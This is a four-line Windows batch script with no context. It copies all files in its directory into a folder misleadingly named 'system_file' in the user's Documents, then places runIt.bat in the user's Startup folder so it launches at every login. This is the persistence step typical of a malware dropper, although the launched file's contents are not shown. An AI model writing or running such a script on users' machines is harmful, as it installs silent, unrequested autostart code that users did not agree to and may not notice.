@echo off
mkdir "%USERPROFILE%\Documents\system_file"
copy *.* "%USERPROFILE%\Documents\system_file"
copy runIt.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp"



